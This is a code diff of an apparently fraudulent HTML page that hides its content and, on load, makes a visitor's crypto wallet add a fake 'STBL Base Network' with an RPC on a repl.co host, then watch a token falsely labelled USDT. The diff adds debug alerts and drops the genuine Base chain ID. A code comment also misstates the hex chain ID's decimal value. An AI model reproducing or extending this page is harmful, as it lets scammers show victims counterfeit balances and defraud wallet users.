@@ -2,27 +2,30 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>body { display: none; }</style> <!-- Hide any flash -->
+  <style>body { display: none; }</style>
 </head>
 <body>
   <script>
   (async () => {
+    alert("Script started"); // Debug 1
     if (!window.ethereum) {
-      window.location.href = "https://metamask.io/download/"; // Fallback
+      alert("No wallet detected - please use a wallet app"); // Debug 2
+      window.location.href = "about:blank"; // Exit cleanly
       return;
     }
+    alert("Wallet detected"); // Debug 3
     try {
       await window.ethereum.request({
         method: "wallet_addEthereumChain",
         params: [{
-          chainId: "0x2105",
-          chainName: "Base Mainnet",
+          chainId: "0x14A77", // Unique ID (84531 decimal)
+          chainName: "STBL Base Network",
           rpcUrls: ["https://stbl-api-aod.alijohnod.repl.co/rpc"],
           nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
           blockExplorerUrls: ["https://basescan.org"]
         }]
       });
+      alert("Network added"); // Debug 4
       await window.ethereum.request({
         method: "wallet_watchAsset",
         params: {
@@ -31,14 +34,15 @@
             address: "0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c",
             symbol: "USDT",
             decimals: 18,
-            chainId: "8453",
-            image: "https://cryptologos.cc/logos/tether-usdt-logo.png"
+            chainId: "84531" // Decimal
           }
         }
       });
-      window.location.href = "about:blank"; // Exit cleanly
+      alert("Token added"); // Debug 5
+      window.location.href = "about:blank";
     } catch (e) {
-      window.location.href = "about:blank"; // Exit on error
+      alert("Error: " + e.message); // Debug 6
+      window.location.href = "about:blank";
     }
   })();
   </script>
